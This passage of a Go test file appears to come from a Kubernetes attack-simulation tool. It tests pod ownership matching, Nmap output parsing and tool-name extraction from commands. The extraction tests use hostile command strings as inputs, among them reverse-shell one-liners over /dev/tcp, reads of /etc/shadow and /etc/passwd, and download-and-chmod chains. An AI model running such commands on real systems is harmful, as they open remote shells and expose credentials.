					t.Errorf("Pod '%s' should be owned by workload, but was not found in relations", pod.GetId())
				}
			}
		})
	}
}

func TestWorkloadAnalysisPartialMatch(t *testing.T) {
	c := NewCampaign(nil)
	namespace := "default"
	workloadName := "api-server"

	// Create pods with different naming patterns
	c.AddEntities(domain.NewPod("api-server-5c77d846b4-h2ccn", namespace))
	c.AddEntities(domain.NewPod("api-server-5c77d846b4-k9xyz", namespace))
	c.AddEntities(domain.NewPod("api-gateway-5c77d846b4-m3abc", namespace)) // different workload
	c.AddEntities(domain.NewPod("unrelated-pod-xyz123", namespace))         // completely unrelated

	// Create and analyze the workload
	workload := domain.NewDeployment(workloadName, namespace)
	facts, err := c.analyzeWorkloadOwnership(workload)

	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	// Only 2 pods should match the api-server workload
	expectedRelations := 2
	if len(facts.Relations) != expectedRelations {
		t.Errorf("Expected %d relations, got %d", expectedRelations, len(facts.Relations))
	}

	// Verify no false matches
	for _, rel := range facts.Relations {
		owns := rel.(domain.Owns)
		targetId := owns.GetTargetId()
		if !contains([]string{
			"api-server-5c77d846b4-h2ccn",
			"api-server-5c77d846b4-k9xyz",
		}, extractPodNameFromId(targetId)) {
			t.Errorf("Unexpected pod matched: %s", targetId)
		}
	}
}

func TestWorkloadAnalysisNoMatchingPods(t *testing.T) {
	c := NewCampaign(nil)
	namespace := "default"
	workloadName := "nginx"

	// Create pods that don't match the workload
	c.AddEntities(domain.NewPod("apache-xyz123", namespace))
	c.AddEntities(domain.NewPod("httpd-abc456", namespace))

	// Create and analyze the workload
	workload := domain.NewDeployment(workloadName, namespace)
	facts, err := c.analyzeWorkloadOwnership(workload)

	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	// No relations should be created
	if len(facts.Relations) != 0 {
		t.Errorf("Expected 0 relations, got %d", len(facts.Relations))
	}

	// Workload should still be in entities
	if len(facts.Entities) != 1 {
		t.Errorf("Expected 1 entity, got %d", len(facts.Entities))
	}
}

func TestWorkloadAnalysisDifferentNamespace(t *testing.T) {
	c := NewCampaign(nil)
	workloadName := "my-app"

	// Create pods in different namespaces
	c.AddEntities(domain.NewPod("my-app-xyz123", "default"))
	c.AddEntities(domain.NewPod("my-app-abc456", "kube-system"))

	// Analyze workload in default namespace
	workload := domain.NewDeployment(workloadName, "default")
	facts, err := c.analyzeWorkloadOwnership(workload)

	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	// Only the pod in the same namespace should be owned
	expectedRelations := 1
	if len(facts.Relations) != expectedRelations {
		t.Errorf("Expected %d relations, got %d", expectedRelations, len(facts.Relations))
	}
}

// Helper function to extract pod name from entity ID
func extractPodNameFromId(id string) string {
	parts := strings.Split(id, "/")
	return parts[len(parts)-1]
}

// Helper function to check if string is in slice
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func TestParseNmapOutput(t *testing.T) {
	nmapOutput := `Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-27 14:58 UTC
Nmap scan report for 10-0-0-29.argocd-server.argocd.svc.cluster.local (10.0.0.29)
Host is up (0.000085s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
8080/tcp open  http-proxy
8083/tcp open  us-srv

Nmap scan report for 10-0-0-196.kube-dns.kube-system.svc.cluster.local (10.0.0.196)
Host is up (0.000048s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
8080/tcp open  http-proxy
8181/tcp open  intermapper

Nmap scan report for 10.0.0.198
Host is up (0.000051s latency).
All 1000 scanned ports on 10.0.0.198 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap scan report for 10-0-0-223.kube-dns.kube-system.svc.cluster.local (10.0.0.223)
Host is up (0.000063s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
8080/tcp open  http-proxy
8181/tcp open  intermapper

Nmap scan report for 10.0.0.187
Host is up (0.000056s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 96:FF:87:5A:FA:D0 (Unknown)

Nmap scan report for noob-5d79464bdb-sn4f5 (10.0.0.214)
Host is up (0.0000040s latency).
All 1000 scanned ports on noob-5d79464bdb-sn4f5 (10.0.0.214) are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (6 hosts up) scanned in 5.10 seconds`

	hosts, err := parseNmapOutput(nmapOutput)
	if err != nil {
		t.Fatalf("parseNmapOutput returned error: %v", err)
	}

	if len(hosts) != 6 {
		t.Fatalf("Expected 6 hosts, got %d", len(hosts))
	}

	// First host: K8s pod with DNS
	h := hosts[0]
	if h.IP != "10.0.0.29" {
		t.Errorf("Host 0: expected IP '10.0.0.29', got '%s'", h.IP)
	}
	if h.DNS != "10-0-0-29.argocd-server.argocd.svc.cluster.local" {
		t.Errorf("Host 0: expected DNS name, got '%s'", h.DNS)
	}
	if len(h.Ports) != 2 {
		t.Errorf("Host 0: expected 2 open ports, got %d", len(h.Ports))
	}
	if h.Ports[8080] != "http-proxy" {
		t.Errorf("Host 0: expected port 8080 service 'http-proxy', got '%s'", h.Ports[8080])
	}

	// Third host: bare IP, no open ports
	h = hosts[2]
	if h.IP != "10.0.0.198" {
		t.Errorf("Host 2: expected IP '10.0.0.198', got '%s'", h.IP)
	}
	if h.DNS != "" {
		t.Errorf("Host 2: expected empty DNS, got '%s'", h.DNS)
	}
	if len(h.Ports) != 0 {
		t.Errorf("Host 2: expected 0 open ports, got %d", len(h.Ports))
	}

	// Fifth host: bare IP with MAC address
	h = hosts[4]
	if h.IP != "10.0.0.187" {
		t.Errorf("Host 4: expected IP '10.0.0.187', got '%s'", h.IP)
	}
	if h.MACAddr != "96:FF:87:5A:FA:D0" {
		t.Errorf("Host 4: expected MAC '96:FF:87:5A:FA:D0', got '%s'", h.MACAddr)
	}
	if h.Ports[22] != "ssh" {
		t.Errorf("Host 4: expected port 22 service 'ssh', got '%s'", h.Ports[22])
	}

	// Sixth host: pod hostname without K8s DNS
	h = hosts[5]
	if h.IP != "10.0.0.214" {
		t.Errorf("Host 5: expected IP '10.0.0.214', got '%s'", h.IP)
	}
	if h.DNS != "noob-5d79464bdb-sn4f5" {
		t.Errorf("Host 5: expected DNS 'noob-5d79464bdb-sn4f5', got '%s'", h.DNS)
	}
}

func TestAnalyzeNmapResults(t *testing.T) {
	tests := []struct {
		name         string
		hosts        []NmapHost
		expectCount  int
		expectPodIdx map[int]struct{ name, ns string } // index -> expected pod name & namespace
		expectSysIdx []int                              // indices that should be UnknownSystem
	}{
		{
			name: "K8s pod DNS produces Pod entity",
			hosts: []NmapHost{
				{
					IP:     "10.0.0.29",
					DNS:    "10-0-0-29.argocd-server.argocd.svc.cluster.local",
					Ports:  map[int]string{8080: "http-proxy"},
					HostUp: true,
				},
			},
			expectCount: 1,
			expectPodIdx: map[int]struct{ name, ns string }{
				0: {name: "argocd-server_10-0-0-29", ns: "argocd"},
			},
		},
		{
			name: "Bare IP produces UnknownSystem",
			hosts: []NmapHost{
				{
					IP:     "10.0.0.198",
					DNS:    "",
					Ports:  map[int]string{},
					HostUp: true,
				},
			},
			expectCount:  1,
			expectSysIdx: []int{0},
		},
		{
			name: "Host down is skipped",
			hosts: []NmapHost{
				{
					IP:     "10.0.0.50",
					DNS:    "",
					Ports:  map[int]string{},
					HostUp: false,
				},
			},
			expectCount: 0,
		},
		{
			name: "redisinsight-service naming",
			hosts: []NmapHost{
				{
					IP:     "10.0.0.179",
					DNS:    "10-0-0-179.redisinsight-service.default.svc.cluster.local",
					Ports:  map[int]string{8001: "vcom-tunnel"},
					HostUp: true,
				},
			},
			expectCount: 1,
			expectPodIdx: map[int]struct{ name, ns string }{
				0: {name: "redisinsight-service_10-0-0-179", ns: "default"},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			facts, err := analyzeNmapResults(tt.hosts)
			if err != nil {
				t.Fatalf("analyzeNmapResults returned error: %v", err)
			}

			if len(facts.Entities) != tt.expectCount {
				t.Fatalf("Expected %d entities, got %d", tt.expectCount, len(facts.Entities))
			}

			for idx, expected := range tt.expectPodIdx {
				entity := facts.Entities[idx]
				pod, ok := entity.(domain.Pod)
				if !ok {
					t.Errorf("Entity %d: expected Pod, got %T", idx, entity)
					continue
				}
				if pod.GetName() != expected.name {
					t.Errorf("Entity %d: expected name '%s', got '%s'", idx, expected.name, pod.GetName())
				}
				if pod.GetNamespace() != expected.ns {
					t.Errorf("Entity %d: expected namespace '%s', got '%s'", idx, expected.ns, pod.GetNamespace())
				}
			}

			for _, idx := range tt.expectSysIdx {
				entity := facts.Entities[idx]
				if _, ok := entity.(domain.UnknownSystem); !ok {
					t.Errorf("Entity %d: expected UnknownSystem, got %T", idx, entity)
				}
			}
		})
	}
}

func TestExtractToolFromCommand(t *testing.T) {
	tests := []struct {
		command  string
		expected string
	}{
		// simple commands
		{"kubectl get pods", "kubectl"},
		{"cat /etc/passwd", "cat"},
		{"nmap -sn 10.244.1.4/24", "nmap"},

		// shell -c wrappers
		{`bash -c "nmap -sn 10.244.1.4/24"`, "nmap"},
		{`sh -c "kubectl get secrets"`, "kubectl"},
		{`bash -c 'curl -sS http://example.com'`, "curl"},
		{`/bin/bash -c "wget http://example.com"`, "wget"},
		{`/usr/bin/sh -c "cat /etc/shadow"`, "cat"},

		// combined flags like -xc
		{`bash -xc "nmap -sn 10.0.0.0/24"`, "nmap"},
		{`sh -ec "kubectl apply -f -"`, "kubectl"},

		// command chains (should return the first tool)
		{"curl -sS -L url -o bin && chmod +x bin", "curl"},
		{"wget url -O bin && chmod +x bin", "wget"},

		// env var prefixes
		{"FOO=bar kubectl get pods", "kubectl"},
		{"A=1 B=2 nmap -sn 10.0.0.0/24", "nmap"},

		// absolute paths
		{"/usr/bin/kubectl get pods", "kubectl"},
		{"/bin/cat /etc/passwd", "cat"},

		// shell used directly (no -c, e.g. reverse shell)
		{"bash >& /dev/tcp/10.0.0.1/4444 0>&1", "bash"},
		{"sh -i >& /dev/tcp/10.0.0.1/4444 0>&1", "sh"},

		// nested shell: bash -c "sh -c 'nmap ...'"
		{`bash -c "sh -c 'nmap -sV target'"`, "nmap"},

		// python one-liner via shell
		{`bash -c "python -c 'import os; os.system(\"id\")'"`, "python"},

		// empty command
		{"", ""},
		{"   ", ""},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := extractToolFromCommand(tt.command)
			if result != tt.expected {
				t.Errorf("extractToolFromCommand(%q) = %q, want %q", tt.command, result, tt.expected)
			}
		})
	}
}

func TestGetInvokedTool(t *testing.T) {
	tests := []struct {
		name     string
		ev       domain.TTPExecuted
		expected string
	}{
		{
			name: "explicit TOOL arg takes priority",
			ev: domain.TTPExecuted{
				Args:      map[string]string{"TOOL": "nmap"},
				Procedure: domain.Procedure{Command: "bash -c \"curl http://example.com\"", Key: "curl"},
			},
			expected: "nmap",
		},
		{
			name: "extracts from command when no TOOL arg",
			ev: domain.TTPExecuted{
				Args:      map[string]string{"TARGET": "10.0.0.1"},
				Procedure: domain.Procedure{Command: `bash -c "nmap -sn 10.244.1.4/24"`, Key: "curl"},
			},
			expected: "nmap",
		},
		{
			name: "falls back to Procedure.GetTool() when command is empty",
			ev: domain.TTPExecuted{
				Args:      map[string]string{},
				Procedure: domain.Procedure{Command: "", Tool: "kubectl", Key: "k8s-api"},
			},
			expected: "kubectl",
		},
		{
			name: "falls back to Procedure.Key when Tool is also empty",
			ev: domain.TTPExecuted{
				Args:      map[string]string{},
				Procedure: domain.Procedure{Command: "", Key: "k8s-api"},
			},
			expected: "k8s-api",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := getInvokedTool(tt.ev)
			if result != tt.expected {
				t.Errorf("getInvokedTool() = %q, want %q", result, tt.expected)
			}
		})
	}
}
